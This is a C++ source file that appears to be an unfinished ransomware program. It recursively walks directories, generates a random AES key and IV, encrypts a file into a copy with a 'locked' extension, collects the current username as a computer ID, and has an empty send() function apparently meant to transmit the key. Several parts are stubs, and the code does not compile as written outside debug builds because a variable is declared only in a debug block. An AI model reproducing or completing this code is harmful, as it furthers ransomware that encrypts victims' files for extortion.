#include <iostream>
#include <string>

#include "tear.h"

#ifdef _WIN32
#	include <windows.h>
#	include <Lmcons.h>
#elif defined(__linux__)
#	include <pwd.h>
#endif

using namespace std;
using namespace boost::filesystem;
using namespace CryptoPP;

void encrypt(const crypt_data* data, string path);
crypt_data* generatekey();
void iterate(const path& parent);
void process(const path& path);
string getid();
void send();

int main(int argc, char* argv[]) {
	iterate(".");

	cout << "Computer ID: " << getid() << endl;

	crypt_data* d = generatekey();

#ifdef DEBUG
	encrypt(d, "./README.md");
#endif

	send();

	delete d;

	return 0;
}

void encrypt(const crypt_data* d, string path) {
	string cipher;

#ifdef DEBUG
	// Print key and initialization vector
	string skey;
	StringSource(d->key, sizeof(d->key), true, new HexEncoder(new StringSink(skey)));
	cout << "Key:\t\t" << skey << endl;
	skey.clear();

	string siv;
	StringSource(d->iv, sizeof(d->iv), true, new HexEncoder(new StringSink(siv)));
	cout << "IV:\t\t" << siv << endl;
	siv.clear();


	string plain;
	FileSource(path.c_str(), true, new StringSink(plain));
	cout << "Plaintext:\t" << plain << endl;
#endif

	CBC_Mode<AES>::Encryption e;
	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);

	StringSource s(plain, true, new StreamTransformationFilter(e, new FileSink((path + LOCKED_EXTENSION).c_str())));

	StreamTransformationFilter filter(e);
	filter.Put((const byte*) plain.data(), plain.size());
	filter.MessageEnd();

	const size_t ret = filter.MaxRetrievable();
	cipher.resize(ret);
	filter.Get((byte*) cipher.data(), cipher.size());

#ifdef DEBUG
	string ciphertext;
	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
	cout << "Ciphertext:\t" << ciphertext << endl;
#endif
}

crypt_data* generatekey() {
	crypt_data* d = new crypt_data;

	AutoSeededRandomPool prng;

	prng.GenerateBlock(d->key, sizeof(d->key));
	prng.GenerateBlock(d->iv, sizeof(d->iv));

	return d;
}

void iterate(const path& parent) {
	string path;
	directory_iterator end_itr;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			iterate(path);
		} else {
			process(path);
		}
	}
}

void process(const path& path) {
#ifdef DEBUG
	cout << "Processing " << path << endl;
#else

#endif
}

string getid() {
#ifdef _WIN32
	char username[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(username, &length);

	return string(username);
#elif defined(__linux__)
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_name);
	}

	return EMPTY;
#endif
}

void send() {

}